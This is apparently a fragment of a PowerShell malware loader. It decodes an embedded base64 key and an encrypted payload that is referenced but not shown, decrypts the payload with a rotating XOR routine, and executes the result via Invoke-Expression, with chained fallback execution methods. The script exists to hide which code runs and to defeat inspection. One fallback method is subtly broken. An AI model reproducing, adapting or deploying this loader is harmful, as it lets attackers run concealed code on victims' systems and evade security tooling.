$cipherrotation = @'
wRHzGdWIeGBuKW/lSbTZwBjjGnRAfH5bIR6+FH2oOk0=
'@

# Layer 2: Base64 Reconstruction
$base64decode = { 
    param([string]$chunkedData)
    
    $reassembled = $chunkedData -replace "`n|`r", ""
    try {
        return [Convert]::FromBase64String($reassembled)
    }
    catch {
        Write-Error "Base64 decoding failed: $_"
        return $null
    }
}

# Layer 3: Rotational XOR Decryption
$xorrotate = {
    param(
        [byte[]]$cipherData,
        [byte[]]$decryptionKey
    )
    
    if (-not $cipherData -or -not $decryptionKey) {
        return $null
    }
    
    $outputBuffer = New-Object byte[] $cipherData.Length
    $rotationState = 0
    
    # Decryption loop with rotation
    for ($position = 0; $position -lt $cipherData.Length; $position++) {
        $keyIndex = ($position + $rotationState) % $decryptionKey.Length
        
        # Reverse XOR with rotation
        $outputBuffer[$position] = $cipherData[$position] -bxor $decryptionKey[$keyIndex]
        
        # Update rotation (must match encryption)
        $rotationState = ($rotationState + $decryptionKey[$keyIndex]) % 7
    }
    
    return $outputBuffer
}

# Layer 4: Main Decryption Orchestrator
$decoderfunction = {
    # Reconstruct data from chunks
    $byteData = & $base64decode $encryptedpayload
    $byteKey = & $base64decode $cipherrotation
    
    if ($byteData -and $byteKey) {
        # Apply rotational XOR decryption
        $decryptedBytes = & $xorrotate -cipherData $byteData -decryptionKey $byteKey
        
        if ($decryptedBytes) {
            return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
        }
    }
    
    Write-Warning "Decryption process failed"
    return $null
}

# Layer 5: Execution Wrapper
$executepayload = {
    $scriptContent = & $decoderfunction
    
    if ($scriptContent) {
        # Multiple execution strategies
        $executionMethods = @(
            { Invoke-Expression $args[0] },
            { & { . { $args[0] } } },
            { [ScriptBlock]::Create($args[0]).Invoke() }
        )
        
        # Use adaptive execution
        try {
            & $executionMethods[0] $scriptContent
        }
        catch {
            try {
                & $executionMethods[1] $scriptContent
            }
            catch {
                & $executionMethods[2] $scriptContent
            }
        }
    }
    else {
        Write-Error "No content to execute"
    }
}

# Execute the layered decryption
& $executepayload
